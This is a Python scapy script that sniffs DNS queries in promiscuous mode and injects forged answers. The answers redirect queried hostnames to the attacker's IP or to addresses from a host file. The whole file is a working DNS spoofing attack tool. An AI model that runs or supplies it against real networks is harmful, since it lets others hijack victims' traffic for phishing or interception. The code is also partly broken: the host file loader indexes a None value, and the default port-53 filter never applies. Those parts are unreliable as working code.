import argparse
from scapy.all import *
import socket
import fcntl
import struct

conf.sniff_promisc=True
hostMap=None

def get_interface_ip(ifname):
	ifnameb = bytes(ifname, 'utf-8')
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifnameb[:15]))[20:24])


def dnsInject(packet):
	#print 'You are in dnsInject'
	#print 'IP addr'
	#print ip
	
	#extract the DNS packet and swap its source and dest IP addresses.Change the response bit to 1.
	if (DNS in packet and packet[DNS].qr == 0 and packet[DNS].ancount == 0):
		#targetHost = packet['DNS Question Record'].qname
		targetHost = packet[DNS].qd.qname.decode('utf-8')[:-1]
		#print 'TargetHOst: '+targetHost		

		#if hostMap is none
		if hostMap is None:
			respIP = ip
		#if host present in hostMap, forge response with the IP add provided
		elif targetHost in hostMap:
			respIP = hostMap[targetHost]
		else:	
			respIP = ip
			#respIP='172.111.111.111'
		forgedResponse = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                DNS(id=packet[DNS].id, qd=packet[DNS].qd, qdcount = packet[DNS].qdcount, ancount = 1, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname,ttl = 50,rdata=respIP))
		send(forgedResponse)
		#print(forgedResponse.show())


def readHostInfo(hostFile):
	if hostFile is None:
		return None

	hostFileHandle = open(hostFile, "r")
	hosts = hostFileHandle.readlines()
	global hostMap
	hostMap = None
	for h in hosts:
		splittedHosts = h.split()
		hostMap[splittedHosts[1]] = splittedHosts[0]
	#	print hostMap[splittedHosts[1]]

	hostFileHandle.close()

	return hostMap			
	

def main():
	argParser = argparse.ArgumentParser(add_help=False)
	argParser.add_argument('-h', nargs='?', default=None)
	argParser.add_argument('-i', nargs='?', default=conf.iface)
	argParser.add_argument('fExp', nargs='*', default=None)
	args = argParser.parse_args()

	#global hostMap	
	#hostMap = None
	interface = args.i
	hostFile = args.h
	filterExp = ''
	if args.fExp is None:
		filterExp = 'port 53'	
	else:
		for f in args.fExp:
			filterExp = filterExp + f + ' '
	

	readHostInfo(hostFile)
	
	#print('exp'+filterExp)
	#print('Interface'+interface)	
	# print('Hostfile'+hostFile)
	
	global ip
	ip = get_interface_ip(interface);
	#print('IP'+ip)	
	sniff(iface=interface,filter=filterExp,prn=dnsInject)	

if __name__ == '__main__':
	main()
	
